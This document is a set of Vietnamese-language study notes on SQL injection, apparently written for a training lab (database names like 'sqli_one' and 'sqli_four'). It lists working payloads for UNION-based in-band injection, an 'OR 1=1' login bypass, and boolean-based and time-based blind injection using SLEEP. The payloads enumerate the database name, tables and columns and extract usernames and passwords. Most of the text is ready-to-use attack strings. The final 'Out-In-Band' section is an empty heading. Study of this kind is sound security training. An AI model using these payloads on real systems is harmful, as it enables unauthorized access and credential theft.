
## In-Band SQLi
- website sử dụng query string (id=?) và hiển thị data ra màn hình (GET)
- chèn union vào query string để truy vấn các thông tin cần thiết
	- 1 UNION SELECT 1,2,..n dò xem kết quả truy vấn có mấy cột
	- 0 UNION SELECT 1,2,database(): dò tên db
	- 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one': dò các table
	- 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users': dò các cột table
	- 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users: display ra dữ liệu
### Blind SQLi
- ko biết kết quả trả về của truy vấn
##### Authentication Bypass
- Chèn sql vào password để always true
	- ' OR 1=1;--
##### Boolean Based
- Response chỉ trả về true/false, sử dụng query string (username=?)
	- xác định đc 1 giá trị (username) trả về false (admin123)
	- admin123' UNION SELECT 1,2,3;--: mò cột của truy vấn
	- admin123' UNION SELECT 1,2,3 where database() like 's%';-- : mò từng ký tự của db
	- admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'a%';--: mò từng ký tự của table
	- admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%'; : dò cột
	- Khi dò cột nhớ thêm các cột đã tìm thấy vào condition để tránh bị trùng 
		- admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
	- admin123' UNION SELECT 1,2,3 from users where username like 'a%: dò username
	- admin123' UNION SELECT 1,2,3 from users where username='admin' and password like 'a%: dò password
##### Time-Based
- Dựa vào thời gian response của truy vấn và hàm SLEEP (hàm này delay truy vấn khi truy vấn này đúng)
	- admin123' UNION SELECT SLEEP(5),2;--: dò cột
	- admin123' UNION SELECT SLEEP(1),2 where database() like 'sqli%';--: dò tên db
	- admin123' UNION SELECT  SLEEP(1), 2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'users%' ;--: mò từng ký tự của table
	- admin123' UNION SELECT  SLEEP(1), 2 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_four' and TABLE_NAME='users' and COLUMN_NAME like 'a%'; : dò cột
	- admin123' UNION SELECT SLEEP(1), 2 FROM users where username like 'admin%';--: dò username
	- admin123' UNION SELECT SLEEP(1), 2 FROM users where username = 'admin' and password like '4961%';-- : dò password
## Out-In-Band SQLi
